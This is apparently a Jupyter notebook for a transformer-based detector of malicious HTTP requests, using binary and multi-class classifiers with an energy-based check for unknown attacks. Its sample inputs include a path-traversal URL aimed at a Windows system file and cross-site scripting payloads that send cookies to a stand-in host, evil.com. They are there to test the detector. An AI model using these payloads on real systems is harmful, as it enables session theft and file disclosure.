{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "548574e4",
   "metadata": {},
   "source": [
    "Loading Libraries\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0b09579e",
   "metadata": {},
   "outputs": [],
   "source": [
    "import torch\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "from tqdm import tqdm\n",
    "from pprint import pprint\n",
    "from transformers import AutoTokenizer, AutoModelForSequenceClassification"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "74b0ae5a",
   "metadata": {},
   "source": [
    "If There is a dataset\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5bcf6a15",
   "metadata": {},
   "outputs": [],
   "source": [
    "# For developers\n",
    "# Load dataset & View first 5 rows of the dataset\n",
    "df = pd.read_csv(\"./path/to/dataset.csv\", dtype=str)\n",
    "df = df.fillna('\"\"') # Fill Empty with \"\"\n",
    "df.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "eb8e783f",
   "metadata": {},
   "source": [
    "Format Input\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f46502d9",
   "metadata": {},
   "outputs": [],
   "source": [
    "# For developers\n",
    "df[\"value\"] = df.apply(\n",
    "    lambda row: f\"\"\"\n",
    "    [METHOD] {row['method']} \n",
    "    [URL] {row['url']} \n",
    "    [COOKIE] {row['cookie']} \n",
    "    [BODY] {row['body']} \n",
    "    [HOST] {row['host']} \n",
    "    [USER_AGENT] {row['user_agent']} \n",
    "    [X_FORWARDED_FOR] {row['x_forwarded_for']} \n",
    "    [REFERER] {row['referer']} \n",
    "    [X_REQUESTED_WITH] {row['x_requested_with']} \n",
    "    [ACCEPT_LANG] {row['accept_language']} \n",
    "    [HTTP_VERSION] {row['http_version']}\"\"\",\n",
    "    axis=1\n",
    ")\n",
    "pprint(df[\"value\"][0])\n",
    "# Formatted Input should that is value column of dataframe\n",
    "# will have values something like this :\n",
    "'''\n",
    "[METHOD] PUT \n",
    "[URL] /contact?path=..%5c..%5c..%5csystem32%5cconfig%5csystem \n",
    "[COOKIE] ABC123; lang=en-IN\n",
    "[BODY] {\"values\": [\"?path=..%5c..%5c..%5csystem32%5cconfig%5csystem\",]} \n",
    "[HOST] linkedinbackup.co [USER_AGENT] Mozilla/5.0 \n",
    "[X_FORWARDED_FOR] \"\" \n",
    "[REFERER] \"\" \n",
    "[X_REQUESTED_WITH] \"\" \n",
    "[ACCEPT_LANG] tr;q=0.9 \n",
    "[HTTP_VERSION] HTTP/1.1\n",
    "'''"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e2df4816",
   "metadata": {},
   "source": [
    "Sample Input recevied through API\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1d37628b",
   "metadata": {},
   "outputs": [],
   "source": [
    "# For End-User\n",
    "# A example request that will be received through an API\n",
    "sample_request = \"\"\"\n",
    "[METHOD] PUT \n",
    "[URL] /shell.php?search=<style>@keyframes \n",
    "[COOKIE] _rails_session=<script>WebSocket('ws://evil.com').send(document.cookie)</script>; _ga=<script>new Image().src='http://evil.com/?c='+document.cookie;</script> \n",
    "[BODY] data=?search=<style>@keyframes x{}</style><iframe style='animation-name:x' onanimationend='alert(1)'>&timestamp=1746479555 \n",
    "[HOST] appletwitter.biz \n",
    "[PROTOCOL]  \n",
    "[USER_AGENT] Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 \n",
    "[ACCEPT] text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 \n",
    "[ACCEPT_ENCODING] gzip, deflate, br \n",
    "[ACCEPT_LANGUAGE] es;q=0.9 \n",
    "[CONTENT_TYPE] multipart/form-data \n",
    "[CONTENT_LENGTH]  \n",
    "[CONNECTION] close \n",
    "[X_FORWARDED_FOR]  \n",
    "[REFERER] \n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5a52d46f",
   "metadata": {},
   "source": [
    "Load Binary Model\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7bb20d8c",
   "metadata": {},
   "outputs": [],
   "source": [
    "binary_model_dir = \"./path/to/absolution_v1.0\"\n",
    "binary_model = AutoModelForSequenceClassification.from_pretrained(\n",
    "    binary_model_dir,\n",
    "    use_safetensors=True  # Explicitly load from .safetensors\n",
    ")\n",
    "binary_model_tokenizer = AutoTokenizer.from_pretrained(binary_model_dir)\n",
    "device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n",
    "binary_model = binary_model.to(device)\n",
    "binary_model.eval()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "57904b5c",
   "metadata": {},
   "source": [
    "Load Multi Model\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "69bb45f9",
   "metadata": {},
   "outputs": [],
   "source": [
    "multi_model = AutoModelForSequenceClassification.from_pretrained(\"./path/to/absolution_v2.0\").to(device)\n",
    "multi_model = multi_model.to(device) # attaching to the same device\n",
    "multi_model.eval()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e543bdc3",
   "metadata": {},
   "source": [
    "Tokenise Input Function\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "064f8675",
   "metadata": {},
   "outputs": [],
   "source": [
    "# For Developers\n",
    "def tokenize(inputs):\n",
    "    return binary_model_tokenizer(\n",
    "        inputs[\"value\"], # Assuming value column is present similar to above example\n",
    "        padding=\"max_length\",\n",
    "        truncation=True,\n",
    "        max_length=512,\n",
    "        return_tensors=\"pt\"\n",
    "    )"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "16323a00",
   "metadata": {},
   "source": [
    "Map inputs to tokenise the dataset\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "309a206f",
   "metadata": {},
   "outputs": [],
   "source": [
    "# tokenized_datasets = {\n",
    "# \"test\": dataset[\"test\"].map(tokenize, batched=True),\n",
    "# }\n",
    "tokenized_datasets = []"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "27598130",
   "metadata": {},
   "source": [
    "Define Energies Based on a Labeled Dataset\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eff05a25",
   "metadata": {},
   "outputs": [],
   "source": [
    "def energy_score(logits, T=1):\n",
    "    return -T * torch.logsumexp(logits / T, dim=1)\n",
    "\n",
    "# Compute energy scores\n",
    "val_energies = []\n",
    "val_labels = []\n",
    "\n",
    "# This is for enterprise to keep at backend and maintain\n",
    "# Update it consistently with new inputs for intrusion detection of unknown malware\n",
    "with torch.no_grad():\n",
    "    for example in tqdm(tokenized_datasets[\"val\"]):\n",
    "        inputs = {\n",
    "            \"input_ids\": torch.tensor([example[\"input_ids\"]]).to(device),\n",
    "            \"attention_mask\": torch.tensor([example[\"attention_mask\"]]).to(device)\n",
    "        }\n",
    "        outputs = multi_model(**inputs)\n",
    "        energy = energy_score(outputs.logits).item()\n",
    "        val_energies.append(energy)\n",
    "        val_labels.append(example[\"label\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6f7b8498",
   "metadata": {},
   "outputs": [],
   "source": [
    "threshold = np.percentile(val_energies, 95)  # 95% of known attacks have energy less than input value\n",
    "pprint(f\"Optimal energy threshold: {threshold}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dc4a796d",
   "metadata": {},
   "source": [
    "Attack Detection Logic\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "24e16b94",
   "metadata": {},
   "outputs": [],
   "source": [
    "# For Enterprise\n",
    "def detect_attack(text, binary_model, multi_model, tokenizer, energy_threshold=-5, device=\"cuda\"):\n",
    "    # Move models to device\n",
    "    binary_model = binary_model.to(device)\n",
    "    multi_model = multi_model.to(device)\n",
    "    \n",
    "    # Tokenize input\n",
    "    inputs = tokenizer(text, return_tensors=\"pt\", truncation=True, max_length=512).to(device)\n",
    "    \n",
    "    # Get predictions from both models\n",
    "    with torch.no_grad():\n",
    "        binary_out = binary_model(**inputs)\n",
    "        multi_out = multi_model(**inputs)\n",
    "    \n",
    "    # Process binary model output\n",
    "    binary_probs = torch.softmax(binary_out.logits, dim=-1)\n",
    "    binary_pred = torch.argmax(binary_probs).item()  # 0=benign, 1=malicious\n",
    "    \n",
    "    # Process multi-class model output\n",
    "    multi_probs = torch.softmax(multi_out.logits, dim=-1)\n",
    "    multi_pred_idx = torch.argmax(multi_probs).item()\n",
    "    multi_pred_label = multi_model.config.id2label[multi_pred_idx]\n",
    "    \n",
    "    # Calculate energy score\n",
    "    energy = energy_score(multi_out.logits).item()\n",
    "    \n",
    "    # Decision logic\n",
    "    # Note : This can be updated at anytime in future\n",
    "    final_label = \"benign\" \n",
    "    confidence = 1.0\n",
    "    \n",
    "    # Case 1: Both models agree on malicious (1 & 1)\n",
    "    if binary_pred == 1 and multi_pred_label != \"benign\":\n",
    "        final_label = multi_pred_label if energy <= energy_threshold else \"unknown_malware\"\n",
    "        confidence = multi_probs[0][multi_pred_idx].item()\n",
    "    \n",
    "    # Case 2: Binary says malicious, multi says benign (1 & 0)\n",
    "    elif binary_pred == 1 and multi_pred_label == \"benign\":\n",
    "        final_label = \"unknown_malware\" if energy > energy_threshold else \"benign\"\n",
    "        confidence = binary_probs[0][1].item()  # Binary's malicious confidence\n",
    "    \n",
    "    # Case 3: Binary says benign, multi says malicious (0 & 1)\n",
    "    elif binary_pred == 0 and multi_pred_label != \"benign\":\n",
    "        final_label = multi_pred_label  # Trust multi-class prediction\n",
    "        confidence = multi_probs[0][multi_pred_idx].item()\n",
    "    \n",
    "    # Case 4: Both say benign but check OOD (0 & 0)\n",
    "    else:\n",
    "        if energy > energy_threshold:\n",
    "            final_label = \"unknown_malware\"\n",
    "            confidence = energy  # Use energy as confidence measure\n",
    "        else:\n",
    "            final_label = \"benign\"\n",
    "            confidence = binary_probs[0][0].item() * multi_probs[0][0].item()  # Combined confidence\n",
    "    \n",
    "    return {\n",
    "        \"final_label\": final_label,\n",
    "        \"confidence\": confidence,\n",
    "        \"binary_score\": binary_probs.cpu().detach().numpy()[0],\n",
    "        \"multi_scores\": multi_probs.cpu().detach().numpy()[0],\n",
    "        \"energy_score\": energy\n",
    "    }"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b70763b4",
   "metadata": {},
   "source": [
    "Threshold Guidance:\n",
    "\n",
    "    Strict Security (Low FPR): energy_threshold = -3\n",
    "\n",
    "    Balanced (Default): energy_threshold = -5\n",
    "\n",
    "    High Sensitivity (Low FN): energy_threshold = -7\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8b4fc2e8",
   "metadata": {},
   "outputs": [],
   "source": [
    "# For enterprise\n",
    "energy_threshold = -4\n",
    "\n",
    "result = detect_attack(\n",
    "    text=sample_request,\n",
    "    binary_model=binary_model,\n",
    "    multi_model=multi_model,\n",
    "    tokenizer=binary_model_tokenizer,\n",
    "    energy_threshold=energy_threshold,  # Tuned threshold from validation\n",
    "    # device=\"cuda\" if torch.cuda.is_available() else \"cpu\"\n",
    ")\n",
    "\n",
    "# Formatted output with proper dictionary access\n",
    "print(f\"\"\"\n",
    "Final Classification: {result['final_label']}\n",
    "Confidence: {result['confidence']:.2%}\n",
    "Energy Score: {result['energy_score']:.2f}\n",
    "Binary Probabilities: [Benign: {result['binary_score'][0]:.4f}, Malicious: {result['binary_score'][1]:.4f}]\n",
    "Multi-Class Probabilities:\"\"\")\n",
    "\n",
    "# Print multi-class probabilities with labels\n",
    "for label, prob in zip(multi_model.config.id2label.values(), result['multi_scores']):\n",
    "    print(f\"  {label}: {prob:.4f}\")\n",
    "\n",
    "# Add OOD threshold reference\n",
    "print(f\"\\nOOD Threshold: {energy_threshold} (Values above this indicate potential unknown attacks)\")\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
